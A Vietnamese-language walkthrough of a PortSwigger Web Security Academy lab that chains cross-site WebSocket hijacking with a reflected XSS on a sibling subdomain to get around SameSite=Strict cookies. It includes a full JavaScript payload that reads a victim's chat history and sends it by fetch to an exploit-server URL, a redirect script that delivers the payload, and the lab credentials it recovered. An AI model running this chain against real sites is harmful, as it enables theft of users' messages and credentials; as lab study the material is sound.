![[Pasted image 20260930072443.png]]

### 1. Trinh sát tính năng Live Chat (CSWSH)
Mình vào tính năng live chat, gửi thử vài tin nhắn. Mở Burp Suite lên xem lịch sử HTTP, mình thấy ==🟡request handshake `GET /chat` tạo kết nối WebSocket.== R==🔴equest này **không có CSRF token**,== nên có thể dính lỗi CSWSH.
Khi refresh trang chat, trình duyệt gửi một message `"READY"`, server lập tức trả về toàn bộ lịch sử chat.
![[Pasted image 20261103142545.png|565]]
Mình lên **Exploit Server**, viết thử một script CSWSH cơ bản: Kết nối tới `wss://lab/chat`, gửi `"READY"`, và dùng `fetch` gửi dữ liệu nhận được về **Burp Collaborator**.
Tuy nhiên, khi xem lại request trong Burp, mình phát hiện **cookie session không được gửi kèm**. Lý do là server đã set cờ `SameSite=Strict` cho cookie, ngăn trình duyệt gửi cookie trong các request cross-site. Vậy là kế hoạch dùng Exploit Server trực tiếp bị bẻ gãy.
![[Pasted image 20261103142845.png|421]]
### 2. Tìm kiếm lỗ hổng phụ (Sibling Domain)
Đề bài gợi ý "hãy chú ý đến các domain cùng site". Mình lục lại Proxy history, để ý thấy một header `Access-Control-Allow-Origin` trỏ đến một domain khác![[Pasted image 20261103144416.png|603]]
Mình mở domain này trên trình duyệt, thấy một form đăng nhập. Mình thử nhập `<script>alert(1)</script>` vào ô username thì thấy nó bị reflect thẳng vào thông báo lỗi -> **Dính Reflected XSS**.
Mình gửi request này sang Repeater, chuột phải chọn `Change request method` để đổi POST thành GET và thấy XSS vẫn nổ.
![[Pasted image 20261103144450.png|424]]

**Điểm mấu chốt:** Vì `cms-...` và domain chính của lab là **anh em ruột** (cùng chung domain gốc `web-security-academy.net`), nên theo tiêu chuẩn của trình duyệt, request từ `cms-...` gửi sang domain chính được tính là **same-site**. Cookie `SameSite=Strict` sẽ được gửi kèm!

### 3. Xây dựng Payload và Bypass
Mình lấy lại đoạn script CSWSH lúc nãy:
```html
<script>
    var ws = new WebSocket('wss://0a1e00900464a987806c4e4600a20074.web-security-academy.net/chat');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        var data = encodeURIComponent(event.data);
        fetch('https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/?data=' + data);
    };
</script>
```

-> do ở đây , mình ko có burpr pro và cái webhook nó bị burp chặn ko cho gửi thông tin nhạy cảm , nên mình phải đổi sang exploit sever với phương thức GET-> sau đó đọc access log
![[Pasted image 20261103150932.png]]

Mình **URL-encode toàn bộ** đoạn script này (để nó có thể nằm gọn trong parameter URL mà không làm hỏng cấu trúc).
![[Pasted image 20261103150954.png]]
Sau đó, trên **Exploit Server**, mình viết một script để điều hướng victim đến trang CMS (nơi có lỗ hổng XSS), nhét cái script CSWSH đã mã hóa vào tham số `username`:
```html
<script>
    document.location = "https://cms-YOUR-LAB-ID.web-security-academy.net/login?username=URL_ENCODED_CSWSH_SCRIPT&password=anything";
</script>
```
*(Lưu ý: Nhớ thay `URL_ENCODED_CSWSH_SCRIPT` bằng chuỗi đã mã hóa ở trên).*
![[Pasted image 20261103145211.png|643]]
Mình bấm **Store** và **View exploit**. Quay lại tab Collaborator bấm **Poll now**, mình thấy nhận được một loạt dữ liệu chat. Mở request WebSocket trong Burp ra kiểm tra thì thấy **cookie session đã được gửi kèm thành công** (vì request xuất phát từ domain cùng site).

### 4. Hốt thành quả
Mình quay lại Exploit Server, bấm **Deliver exploit to victim**.
Đợi vài giây, mình mở Collaborator lên **Poll now**, thấy một đống HTTP request chứa lịch sử chat của victim. Lục lọi trong đám dữ liệu đó, mình tìm thấy đoạn tin nhắn chứa **username và password** của victim.
Lấy tài khoản đó đăng nhập vào lab -> **Solved**!

![[Pasted image 20261103150706.png]]
-> decode 
- **Username:** `carlos`
- **Password:** `sotz79deu04ovi151mdj`
![[Pasted image 20261103150644.png]]

> [!NOTE]
> Bài này cực kỳ hay ở chỗ nó dạy ta phân biệt rõ giữa **"Origin" (Nguồn)** và **"Site" (Trang)**. 
> `cms-lab.net` và `lab.net` là hai Origin khác nhau (nên chặn CORS), nhưng lại là cùng một Site (chung eTLD+1). Chính vì vậy, `SameSite=Strict` không thể cứu được server, và ta có thể dùng XSS ở domain phụ làm bàn đạp (pivot) để tấn công domain chính.

